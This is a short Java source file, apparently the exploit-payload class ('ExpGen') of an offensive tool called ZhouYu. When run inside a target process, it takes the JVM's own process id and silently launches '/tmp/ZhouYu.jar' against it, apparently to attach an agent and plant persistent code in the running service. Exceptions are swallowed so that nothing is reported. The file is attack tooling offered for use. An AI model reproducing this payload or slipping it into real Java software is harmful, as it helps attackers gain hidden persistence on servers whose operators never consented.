package me.threedr3am.zhouyu.agent;

import java.io.IOException;

/**
 * @author threedr3am
 */
public class ExpGen {

    public static void main(String[] args) throws IOException {
        try {
          String pid = java.lang.management.ManagementFactory.getRuntimeMXBean().getName();
          int indexOf = pid.indexOf('@');
          if (indexOf > 0) {
            pid = pid.substring(0, indexOf);
            Runtime.getRuntime().exec(String.format("java -jar /tmp/ZhouYu.jar %s", pid));
          }
        } catch (Throwable throwable) {

        }
    }
}
